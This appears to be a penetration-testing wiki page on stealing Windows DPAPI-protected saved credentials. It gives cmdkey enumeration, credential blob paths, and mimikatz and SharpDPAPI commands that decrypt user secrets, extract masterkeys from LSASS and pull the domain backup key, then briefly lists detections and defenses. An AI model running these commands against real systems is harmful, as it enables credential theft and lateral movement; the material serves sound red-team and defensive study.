# DPAPI and Saved Credentials

**The Windows Data Protection API (DPAPI) is how Windows stores "remembered" secrets — Credential Manager entries, saved RDP passwords, browser logins, Wi-Fi keys, and scheduled-task credentials — and in a user's context you can decrypt them, while as SYSTEM (or with the domain backup key) you can decrypt *anyone's*.** DPAPI secrets are a rich, frequently-overlooked credential source that turns one foothold into more: a saved RDP password or a stored domain credential often unlocks a more privileged account or a lateral hop. This note complements the on-host sweep in [Pillaging](../Pillaging.md) and the LSASS route in [LSASS Credential Dumping](LSASS-Credential-Dumping.md).

## Enumerate what is stored

```cmd
:: Credential Manager entries (generic + domain, incl. saved RDP TERMSRV/*)
cmdkey /list
:: saved RDP connection files
dir /s /b %USERPROFILE%\*.rdp 2>nul
```

DPAPI-protected blobs live under the user's profile:

```text
%APPDATA%\Microsoft\Credentials\        (Credential Manager)
%APPDATA%\Microsoft\Protect\<SID>\      (masterkeys)
%LOCALAPPDATA%\Microsoft\Vault\         (Windows Vault)
```

## Decrypt DPAPI secrets

In the **user's** context, tooling decrypts transparently using the logged-on user's masterkey:

```text
mimikatz # dpapi::cred /in:%APPDATA%\Microsoft\Credentials\<blob>
SharpDPAPI.exe triage        # enumerates + decrypts credentials, vaults, RDP, browser
SharpDPAPI.exe rdg            # decrypts saved RDP / RDCMan.settings passwords
```

As **SYSTEM** you can extract all users' masterkeys; in a domain, the **DPAPI domain backup key** (from a DC) decrypts every user's DPAPI secrets offline:

```text
mimikatz # sekurlsa::dpapi                       # masterkeys from LSASS (needs SYSTEM/SeDebug)
mimikatz # lsadump::backupkeys /system:dc01 ...  # domain backup key (DA)
```

Saved RDP credentials also enable **session hijacking**/lateral movement — see [Interacting with Users](../Interacting-with-Users.md).

## Detection and defenses

- **Detection:** access to `Microsoft\Credentials`/`Protect` directories, `cmdkey /list`, DPAPI/`SharpDPAPI`/`mimikatz dpapi` usage, LSASS masterkey extraction.
- **Defenses:** avoid saving RDP/domain credentials; clear Credential Manager; enable Credential Guard; protect the DPAPI domain backup key (treat DCs as tier-0).

## Related
- [Password Mining](Password-Mining.md) — folder hub for credential discovery
- [LSASS Credential Dumping](LSASS-Credential-Dumping.md) — masterkeys and live secrets from LSASS
- [Pillaging](../Pillaging.md) — the broader post-escalation credential sweep
- [Interacting with Users](../Interacting-with-Users.md) — saved RDP creds for lateral movement
- Pass The Hash Attack — using recovered credentials/hashes
